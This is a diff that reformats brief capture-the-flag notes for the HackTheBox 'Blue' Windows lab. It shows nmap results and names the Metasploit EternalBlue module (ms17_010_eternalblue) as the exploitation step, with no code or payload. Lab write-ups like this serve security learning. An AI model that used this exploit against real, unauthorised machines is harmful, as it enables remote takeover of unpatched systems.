@@ -1,13 +1,15 @@
-----------------------------------------------------
-# Author -> Shubham Rannpise
-----------------------------------------------------
 # Blue
-# 16/3/2023
+
+
+| Key | Value |
+|-----|-------|
+| Platform | HackTheBox |
+| OS | Windows |
+| Difficulty | Easy |
+
 10.10.10.40
 
-----------------------------------------------------
-# nmap
-----------------------------------------------------
+## Recon
 PORT      STATE SERVICE
 135/tcp   open  msrpc
 139/tcp   open  netbios-ssn
@@ -22,15 +24,10 @@ PORT      STATE SERVICE
 |   VULNERABLE:
 
 
-
-----------------------------------------------------
-# exploitation
-----------------------------------------------------
+## Exploitation
 msfconsole
 use (windows/smb/ms17_010_eternalblue)
 set variables and exploit
 
-----------------------------------------------------
-# priv esc
-----------------------------------------------------
+## Privilege Escalation
 you are already root
